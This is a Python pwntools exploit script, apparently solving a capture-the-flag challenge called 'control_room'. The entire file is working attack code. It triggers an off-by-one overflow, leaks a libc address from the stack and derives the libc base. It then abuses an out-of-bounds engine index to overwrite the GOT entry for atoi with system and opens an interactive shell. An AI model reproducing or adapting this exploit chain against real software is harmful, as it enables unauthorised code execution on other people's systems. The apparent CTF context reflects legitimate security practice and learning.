from pwn import *

exe = ELF("./control_room")
libc = ELF("./libc.so.6")
#ld = ELF("./ld-2.35.so")

context.binary = exe
context.log_level = 'info'

gdbscript = '''
'''

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.PLT_DEBUG:
            gdb.attach(r, gdbscript=gdbscript)
            pause()
    else:
        r = remote(remote_url, remote_port)

    return r

r = conn()

def configure_engine(idx, v1, v2):
    r.sendline(b'1') # configure Engine
    r.sendline(str(idx).encode())
    r.sendline(str(v1).encode())
    r.sendline(str(v2).encode())

    r.sendline(b'y')

# Trigger the off-by-one bug
r.send(b'a'*0x100)
r.sendline(b'n')
r.send(b'256')
r.send(b'a'*0x100)

# Leak stack UDA, which contains libc address
r.sendline(b'3')
r.sendline(b'ay')

r.sendline(b'4')
r.recvuntil(b'Latitude  : ')
r.recvuntil(b'Latitude  : ')
r.recvuntil(b'Latitude  : ')
r.recvuntil(b'Latitude  : ')
r.recvuntil(b'Latitude  : ')
r.recvuntil(b'Longitude : ')

leaked_libc = int(r.recvline().strip())
log.info(f'leaked_libc : {hex(leaked_libc)}')
libc.address = leaked_libc - (libc.symbols.atoi+20)
log.info(f'libc base = {hex(libc.address)}')

# Change role to technician
r.sendline(b'5')
r.sendline(b'1')
engines_addr = 0x405120

# Change atoi to system

configure_engine((exe.got['atoi']-engines_addr) // 0x10, libc.symbols.system, 0x401150) 
# r.sendline(b'sh') # Trigger a shell
r.interactive()
